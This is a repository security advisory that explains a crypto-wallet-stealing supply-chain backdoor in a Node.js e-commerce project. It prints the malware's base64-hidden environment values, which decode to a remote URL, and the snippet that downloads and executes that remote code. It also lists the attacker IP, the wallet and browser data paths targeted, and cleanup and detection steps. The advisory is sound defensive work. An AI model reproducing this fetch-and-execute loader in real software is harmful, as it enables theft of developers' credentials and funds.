# Bootstrap.js Issue - Quick Summary

## 🚨 **CRITICAL: This Repository Contains Malware**

---

## What's the Problem?

The `server/utils/bootstrap.js` file is **malware** designed to steal cryptocurrency wallets.

### In Simple Terms:

1. **What it does**: Downloads and runs malicious code from the internet
2. **What it steals**: 
   - Cryptocurrency wallets (MetaMask, Exodus, Phantom, etc.)
   - Browser login credentials
   - Personal data
3. **When it activates**: As soon as you run `npm start` or `npm run dev`
4. **Who controls it**: An attacker at IP address 146.70.41.188

---

## How It Works (Technical)

```
1. You run: npm run dev
   ↓
2. Server starts (server/server.js)
   ↓
3. Loads app.js
   ↓
4. Line 32 calls: initAppBootstrap()
   ↓
5. bootstrap.js executes:
   - Decodes hidden URL: https://jsonkeeper.com/b/05H4K
   - Downloads malicious JavaScript from that URL
   - Executes it with full system permissions
   ↓
6. Malware runs:
   - Scans your computer for crypto wallets
   - Copies wallet files
   - Zips them up
   - Sends to attacker's server
   ↓
7. Your cryptocurrency is stolen
```

---

## The Malicious Code

### Environment Variables (Base64 Encoded to Hide):

```env
DEV_API_KEY="aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzA1SDRL"
# Decodes to: https://jsonkeeper.com/b/05H4K

DEV_SECRET_KEY="eC1zZWNyZXQta2V5"  
# Decodes to: x-secret-key

DEV_SECRET_VALUE="Xw=="
# Decodes to: _
```

### What bootstrap.js Does:

```javascript
// 1. Decode the malicious URL
const src = atob(process.env.DEV_API_KEY);  
// Result: https://jsonkeeper.com/b/05H4K

// 2. Download malicious code
const maliciousCode = (await axios.get(src)).data.cookie;

// 3. Execute it (like eval)
const handler = new Function('require', maliciousCode);
handler(require);  // <-- YOUR WALLETS GET STOLEN HERE
```

---

## What Does the Malware Target?

### Cryptocurrency Wallets:
- ✅ MetaMask (all browsers)
- ✅ Phantom (Solana)
- ✅ Exodus (desktop & browser)
- ✅ Coinbase Wallet
- ✅ Trust Wallet
- ✅ Brave Wallet
- ✅ 50+ other crypto wallet extensions

### Browsers Affected:
- Chrome
- Firefox
- Edge
- Opera
- Brave

### File Locations Scanned:
```
Windows:
%AppData%/Local/Google/Chrome/User Data/
%AppData%/Roaming/Exodus/

macOS:
~/Library/Application Support/Google/Chrome/
~/Library/Application Support/BraveSoftware/

Linux:
~/.config/google-chrome/
~/.config/BraveSoftware/
```

---

## 🚨 Have You Already Run This Code?

### If YES - Do This IMMEDIATELY:

#### Priority 1: Stop the Code
```bash
pkill -9 node
```

#### Priority 2: Move Your Crypto (Use a DIFFERENT Computer)
1. Transfer ALL cryptocurrency to NEW wallets
2. Use a clean computer (not this one)
3. Assume all current wallets are compromised

#### Priority 3: Change All Passwords (Use a DIFFERENT Computer)
- Email accounts
- Crypto exchanges
- Banking
- Any service you logged into from this machine

#### Priority 4: System Check
```bash
# Check for suspicious outbound connections
lsof -i -P -n | grep ESTABLISHED | grep 146.70.41.188

# Check for recently created ZIP files
find ~ -name "*.zip" -mtime -1

# Check for suspicious processes
ps aux | grep -i python
```

#### Priority 5: Consider Full System Reinstall
- This is the only way to be 100% sure

---

## 🛠️ How to Clean This Repository

### Option 1: Automatic Cleanup (Recommended)

```bash
# Run the cleanup script
bash REMOVE_MALWARE.sh
```

### Option 2: Manual Cleanup

```bash
# 1. Disable bootstrap in app.js
nano server/app.js
# Comment out line 5 and line 32:
# // const {initAppBootstrap} = require('./utils/bootstrap');
# // initAppBootstrap();

# 2. Remove/rename bootstrap file
mv server/utils/bootstrap.js server/utils/bootstrap.js.DISABLED

# 3. Remove malicious env files
rm server/.env
rm server/config/.config.env

# 4. Create clean config
cp server/config/config.env.example server/config/config.env
nano server/config/config.env
# Add your LEGITIMATE MongoDB URI and other settings
# DO NOT include DEV_API_KEY, DEV_SECRET_KEY, or DEV_SECRET_VALUE
```

### Option 3: Start Fresh (Safest)

Don't use this repository. Find a trusted e-commerce template instead.

---

## Verification After Cleanup

Run these checks:

```bash
# Should find NO active calls
grep -r "initAppBootstrap()" server/

# Should find NO malicious keys  
grep -r "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzA1SDRL" .

# Should NOT exist
ls server/utils/bootstrap.js

# All three should return empty or "not found"
```

---

## Why This is Dangerous

### Traditional Malware:
- Obvious (antivirus detects it)
- Requires user to download .exe file
- Limited to one computer

### This Malware:
- ✅ Disguised as legitimate developer tool
- ✅ No antivirus detection (it's "just JavaScript")
- ✅ Targets developers (who often have crypto wallets)
- ✅ Executes with full system permissions
- ✅ Can update itself remotely (code is fetched from URL)
- ✅ Obfuscated (hard to read/analyze)
- ✅ Steals from multiple sources automatically

**This is a supply chain attack targeting the development community.**

---

## Red Flags (How to Spot This in Future)

🚩 Base64-encoded URLs in environment variables
🚩 `atob()` function with external URLs
🚩 `Function.constructor` or `eval()`
🚩 Downloading and executing code from internet
🚩 Obfuscated JavaScript (unreadable variable names)
🚩 Try-catch blocks that silence all errors
🚩 Unusual external API calls during app startup
🚩 References to "bootstrap" or "init" that aren't framework-related

---

## Where is the Malware?

### Files Infected:
1. **server/utils/bootstrap.js** - Main malware
2. **server/.env** - Contains malicious config
3. **server/config/.config.env** - Contains malicious config
4. **server/app.js** - Calls the malware (line 32)

### Files Clean (Probably):
- Frontend React code (src/)
- Other backend files (appear legitimate)

**However**: If someone added malware once, there could be more. Don't trust this repository.

---

## Who Added This?

Check git history:

```bash
git log --all --full-history -- server/utils/bootstrap.js
git log --oneline --all
git blame server/utils/bootstrap.js
```

Possibilities:
1. Original repository owner is malicious
2. Repository was compromised after creation
3. This is a fork of a compromised repository
4. Malware was injected via compromised npm package

---

## Frequently Asked Questions

### Q: Can I just remove bootstrap.js and use the rest?
**A:** Not recommended. If there's one backdoor, there may be others.

### Q: Is my crypto definitely stolen if I ran this?
**A:** Not definitely, but assume YES. Move funds immediately.

### Q: Will antivirus detect this?
**A:** Probably not. It's JavaScript, not a traditional virus.

### Q: How many people are affected?
**A:** Unknown. Anyone who cloned and ran this repository.

### Q: Can I report this?
**A:** Yes:
- GitHub Security: https://github.com/security
- FBI IC3: https://www.ic3.gov (if you lost money)
- Local law enforcement

### Q: Is the e-commerce code itself good?
**A:** The code appears functional, but trust is broken. Don't use it.

### Q: Why would someone do this?
**A:** Money. Cryptocurrency theft is very profitable and hard to trace.

---

## Safe Installation (After Cleanup)

Only if you've verified the malware is removed:

```bash
# 1. Verify cleanup
bash REMOVE_MALWARE.sh

# 2. Install dependencies
npm install

# 3. Setup MongoDB Atlas (required)
# Get connection string from: https://mongodb.com/cloud/atlas

# 4. Configure environment
cp server/config/config.env.example server/config/config.env
nano server/config/config.env

# Add ONLY legitimate settings:
PORT=4000
MONGO_URI=your_mongodb_connection_string
JWT_SECRET=your_random_secret_key
NODE_ENV=development

# 5. Enable database (if still commented)
nano server/server.js
# Line 12: Uncomment connectDatabase();

# 6. Run application
npm run dev

# 7. Access at:
# Frontend: http://localhost:3000
# Backend: http://localhost:4000
```

---

## Summary

| Aspect | Details |
|--------|---------|
| **Malware Type** | Cryptocurrency Wallet Stealer |
| **Severity** | CRITICAL |
| **Vector** | Supply Chain Attack |
| **Target** | Developers with crypto wallets |
| **Activation** | Running `npm start` or `npm run dev` |
| **Impact** | Complete theft of cryptocurrency |
| **Detection** | Low (no antivirus alerts) |
| **Status** | Confirmed malicious |

---

## Documents to Read

1. **BOOTSTRAP_ISSUE_SUMMARY.md** (this file) - Quick overview
2. **SECURITY_ANALYSIS_BOOTSTRAP.md** - Detailed technical analysis
3. **INSTALLATION_GUIDE.md** - How to install (after malware removal)
4. **QUICK_START.md** - Quick setup guide

---

## Next Steps

- [ ] Read the security analysis
- [ ] If you ran the code, follow emergency procedures
- [ ] Run malware removal script
- [ ] Verify cleanup
- [ ] Decide if you want to continue using this code (not recommended)
- [ ] Report to GitHub
- [ ] Warn others who may have this code

---

## Final Warning

**DO NOT RUN THIS CODE WITHOUT REMOVING THE MALWARE FIRST**

This is real malware that will steal real money. Treat it seriously.

---

*Last Updated: 2025-11-11*
*Severity: CRITICAL*
*Status: ACTIVE THREAT*
